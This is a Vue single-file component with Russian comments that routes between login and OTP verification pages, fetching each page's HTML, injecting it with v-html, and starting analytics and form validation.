<template>
    <div
        id="page-content"
        class="flex flex-d-c jc-center ai-c"
        style="position: relative; z-index: 1"
        v-html="pageContent"
    ></div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { initPageAnalytics } from './shared/utils/analytics-handlers'
import { initFormValidation } from './shared/utils/form-validator'
import { initLoginBackButton } from './pages/login/back-button-handler'

const pageContent = ref('')
const pageRoutes: Array<{ path: string; pageName: string }> = [
    { path: '/login-otp-resend-support-and-email', pageName: 'login-otp-resend-support-and-email' },
    { path: '/login-otp-resend-phone-and-email', pageName: 'login-otp-resend-phone-and-email' },
    { path: '/login-otp-resend-phone-and-sms', pageName: 'login-otp-resend-phone-and-sms' },
    { path: '/login-otp-resend-phone', pageName: 'login-otp-resend-phone' },
    { path: '/login-otp-resend-email', pageName: 'login-otp-resend-email' },
    { path: '/login-otp-resend-sms', pageName: 'login-otp-resend-sms' },
    { path: '/login-otp-phone', pageName: 'login-otp-phone' },
    { path: '/login-otp-email', pageName: 'login-otp-email' },
    { path: '/conferme-email', pageName: 'conferme-email' },
    { path: '/login', pageName: 'login' },
]

// Загрузка контента страницы (FSD: pages/)
const loadPage = async (pageName: string) => {
    const response = await fetch(`/src/pages/${pageName}/index.html`)
    const html = await response.text()
    pageContent.value = html

    // Инициализация аналитики и валидации для страницы
    setTimeout(() => {
        initPageAnalytics(pageName)
        initFormValidation() // Универсальная валидация форм

        // Инициализация back-button с backUrl для login
        if (pageName === 'login') {
            initLoginBackButton()
        }
    }, 200)
}

// Определяем какую страницу загрузить
onMounted(() => {
    const currentPath = window.location.pathname.toLowerCase()
    const activeRoute = pageRoutes.find(({ path }) => currentPath.startsWith(path))

    loadPage(activeRoute?.pageName ?? 'login')
})
</script>
